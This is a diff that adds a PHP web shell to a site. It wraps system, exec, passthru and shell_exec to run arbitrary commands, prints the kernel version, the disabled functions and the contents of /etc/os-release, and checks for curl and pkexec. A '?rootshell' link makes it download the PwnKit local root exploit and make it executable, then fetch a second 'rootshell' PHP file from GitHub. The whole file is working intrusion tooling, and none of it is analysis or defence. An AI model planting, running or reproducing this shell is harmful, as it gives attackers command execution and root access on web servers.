@@ -1,0 +1,64 @@
+<?php
+error_reporting(0);
+function ekse($cmd) {
+	if(function_exists('system')) {
+		@ob_start();
+		@system($cmd);
+		$buff = @ob_get_contents(); 		
+		@ob_end_clean();
+		return $buff;
+	} elseif(function_exists('exec')) {
+		@exec($cmd,$results);
+		$buff = "";
+		foreach($results as $result) {
+			$buff .= $result;
+		} return $buff;
+	} elseif(function_exists('passthru')) {
+		@ob_start();
+		@passthru($cmd);
+		$buff = @ob_get_contents();
+		@ob_end_clean();
+		return $buff;
+	} elseif(function_exists('shell_exec')) {
+		$buff = @shell_exec($cmd);
+		return $buff;
+	}
+}
+function anu() {
+$kernel = php_uname();
+$ds = @ini_get("disable_functions");
+$show_ds = (!empty($ds)) ? "$ds" : "NONE";
+$curl = (function_exists('curl_version')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
+$pkexec = (ekse('pkexec --version')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
+$os = ekse("cat /etc/os-release");
+echo "System : <gr>".$kernel."</gr><br>";
+echo "Disable Functions : <br><textarea cols='50' rows='5'>$show_ds</textarea><br>";
+echo "OS : <br><textarea cols='42' rows='10'>$os</textarea></br>";
+echo "CURL : $curl | PKEXEC : $pkexec<br>";
+}
+?>
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>system root</title>
+	</head>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Ubuntu');
+body{font-family:'Ubuntu';}rd{color:red;}gr{color:green;}
+</style>
+<body>
+<b>
+<?php 
+if(isset($_GET['rootshell'])) {
+	ekse('curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o pwn;chmod +x pwn');
+	ekse('curl -fsSL https://raw.githubusercontent.com/hekerprotzy/rootshell/main/root2.php -o rootshell.php');
+	echo '<a href="./rootshell.php">rootshell.php</a>';
+	exit;
+}
+anu();
+?>
+<br>make sure disable_functions, curl, pkexec & all enabled.<br>
+<a href="?rootshell">touch here</a>
+</b>
+</body>
+</html>
